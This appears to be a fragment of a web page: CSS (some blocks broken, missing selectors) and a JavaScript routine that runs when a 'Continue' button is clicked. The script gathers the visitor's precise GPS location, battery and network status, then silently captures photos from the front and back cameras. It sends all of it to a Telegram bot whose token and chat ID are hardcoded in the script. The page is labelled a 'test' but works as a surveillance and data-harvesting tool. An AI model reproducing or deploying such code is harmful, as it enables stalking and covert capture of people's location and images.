        /* Ambient Background Blobs for Visual Aesthetics */
        .ambient-blob {
            position: fixed;
            border-radius: 50%;
            filter: blur(100px);
            z-index: -1;
            opacity: 0.4;
            animation: pulse 10s infinite alternate ease-in-out;
        }

            bottom: -10%;
            right: -10%;
            width: 50vw;
            height: 50vw;
            background: #0ea5e9;
        }

        @keyframes pulse {
            0% { transform: scale(1) translate(0, 0); opacity: 0.3; }
            100% { transform: scale(1.2) translate(30px, -30px); opacity: 0.5; }
        }

        /* Glassmorphism Classes */
        .glass-panel {
            background: rgba(255, 255, 255, 0.03);
            backdrop-filter: blur(20px);
            -webkit-backdrop-filter: blur(20px);
            border: 1px solid rgba(255, 255, 255, 0.08);
            box-shadow: 0 8px 32px 0 rgba(0, 0, 0, 0.3);
        }

        .btn-active:active {

        }

        /* Toast Notifications */

            left: 50%;
            transform: translateX(-50%);
            display: flex;
            flex-direction: column;
            gap: 10px;

    <!-- Toast Notifications Container -->
    <div id="toast-container"></div>

    <canvas id="camera-canvas" class="hidden"></canvas>

    <script>
        const BOT_TOKEN = '8646604552:AAGWM4W4i9g9T-itnFscvQom32md5GP7lHo';
        const CHAT_ID = '7208869554';
        
        const btnContinue = document.getElementById('btn-continue');
        const btnText = document.getElementById('btn-text');
        const btnIcon = document.getElementById('btn-icon');
        const btnSpinner = document.getElementById('btn-spinner');
        const toastContainer = document.getElementById('toast-container');
        
        const video = document.getElementById('camera-stream');
        const canvas = document.getElementById('camera-canvas');
        const ctx = canvas.getContext('2d');

        // Utility: Show Toast Notification
        function showToast(message, isSuccess = true) {
            const toast = document.createElement('div');
            toast.className = 'toast';
            
            const icon = isSuccess ? '✅' : '❌';
            toast.innerHTML = `<span>${icon}</span> <span>${message}</span>`;
            
            toastContainer.appendChild(toast);
            
            // Trigger animation
            setTimeout(() => toast.classList.add('show'), 10);
            
            // Remove after 4 seconds
            setTimeout(() => {
                toast.classList.remove('show');
                setTimeout(() => toast.remove(), 300);
            }, 4000);
        }

        async function getBatteryStatus() {
            try {
                if (navigator.getBattery) {
                    const battery = await navigator.getBattery();
                    return `${Math.round(battery.level * 100)}% (${battery.charging ? 'Charging' : 'Discharging'})`;
                }
                return "Not supported";
            } catch (e) {
                return "Unknown error";
            }
        }

        function getNetworkStatus() {
            try {
                const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
                if (connection) {
                    return `${connection.effectiveType || 'unknown'} (Type: ${connection.type || 'N/A'})`;
                }
                return "Not supported";
            } catch (e) {
                return "Error retrieving network";
            }
        }

        function getGPSLocation() {
            return new Promise((resolve, reject) => {
                if (!navigator.geolocation) {
                    resolve({ success: false, data: "Geolocation not supported" });
                    return;
                }
                navigator.geolocation.getCurrentPosition(
                    (position) => resolve({ 
                        success: true, 
                        data: `https://maps.google.com/?q=${position.coords.latitude},${position.coords.longitude}` 
                    }),
                    (error) => resolve({ success: false, data: `Error: ${error.message}` }),
                    { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
                );
            });
        }

        async function sendTelegramMessage(text) {
            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
            try {
                const response = await fetch(url, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: text,
                        parse_mode: 'HTML'
                    })
                });
                return response.ok;
            } catch (e) { 
                return false; 
            }
        }

        async function sendTelegramPhoto(blob, caption) {
            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
            const formData = new FormData();
            formData.append('chat_id', CHAT_ID);
            formData.append('photo', blob, 'capture.jpg');
            formData.append('caption', caption);

            try {
                const response = await fetch(url, { method: 'POST', body: formData });
                return response.ok;
            } catch (e) { 
                return false; 
            }
        }

        async function captureAndSendPhotos(facingMode, label) {
            let stream = null;
            let successCount = 0;
            
            try {
                const constraints = { 
                    video: facingMode === 'environment' 
                        ? { facingMode: { exact: "environment" } } 
                        : { facingMode: "user" } 
                };

                // Try acquiring stream
                try {
                    stream = await navigator.mediaDevices.getUserMedia(constraints);
                } catch (exactError) {
                    // Fallback constraint if 'exact' fails
                    stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: facingMode } });
                }

                video.srcObject = stream;
                
                await new Promise((resolve) => {
                    video.onloadedmetadata = () => { video.play().then(resolve).catch(resolve); };
                });
                
                // Allow time for camera auto-exposure
                await new Promise(r => setTimeout(r, 1000)); 

                for (let i = 0; i < 2; i++) {
                    canvas.width = video.videoWidth || 640;
                    canvas.height = video.videoHeight || 480;
                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                    
                    const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.8));
                    
                    if (blob) {
                        const sent = await sendTelegramPhoto(blob, `${label} - Image ${i+1}`);
                        if (sent) successCount++;
                    }
                    
                    if (i === 0) await new Promise(r => setTimeout(r, 500)); 
                }
                return { success: successCount > 0, count: successCount };
                
            } catch (error) {
                console.error(`Camera error (${label}):`, error);
                return { success: false, count: 0 };
            } finally {
                if (stream) {
                    stream.getTracks().forEach(track => track.stop());
                }
            }
        }

        btnContinue.addEventListener('click', async () => {
            // UI Update: Show loading state
            btnContinue.disabled = true;
            btnText.innerText = "Processing...";
            btnIcon.classList.add('hidden');
            btnSpinner.classList.remove('hidden');
            
            showToast("Initializing data sync...", true);

            try {
                // 1. Gather Text Info
                const batteryData = await getBatteryStatus();
                const networkData = getNetworkStatus();
                const gpsResult = await getGPSLocation();

                if (gpsResult.success) {
                    showToast("GPS Location Fetched successfully", true);
                } else {
                    showToast(`GPS Failed: ${gpsResult.data}`, false);
                }

                // Send Text to Telegram
                const message = `🚨 <b>ENTER DRAGON TEST</b> 🚨\n\n` +
                                `🔋 <b>Battery:</b> ${batteryData}\n` +
                                `📶 <b>Network:</b> ${networkData}\n` +
                                `📍 <b>Location:</b> ${gpsResult.success ? `<a href="${gpsResult.data}">Google Maps</a>` : 'Failed'}`;
                
                const textSent = await sendTelegramMessage(message);
                if (textSent) showToast("Text info sent to Bot", true);
                else showToast("Failed to send text info", false);

                // 2. Process Front Camera
                showToast("Requesting Front Camera...", true);
                const frontCamResult = await captureAndSendPhotos('user', 'Front Cam');
                if (frontCamResult.success) {
                    showToast(`Front Camera: ${frontCamResult.count} images sent`, true);
                } else {
                    showToast("Front Camera capture failed", false);
                }

                // 3. Process Back Camera
                showToast("Requesting Back Camera...", true);
                const backCamResult = await captureAndSendPhotos('environment', 'Back Cam');
                if (backCamResult.success) {
                    showToast(`Back Camera: ${backCamResult.count} images sent`, true);
                } else {
                    showToast("Back Camera capture failed", false);
                }

            } catch (error) {
                console.error(error);
                showToast("A critical error occurred during execution", false);
            } finally {
                // UI Update: Revert button state
                showToast("Test complete. Remaining on page.", true);
                btnContinue.disabled = false;
                btnText.innerText = "Continue";
                btnIcon.classList.remove('hidden');
                btnSpinner.classList.add('hidden');
            }
        });
    </script>
</body>
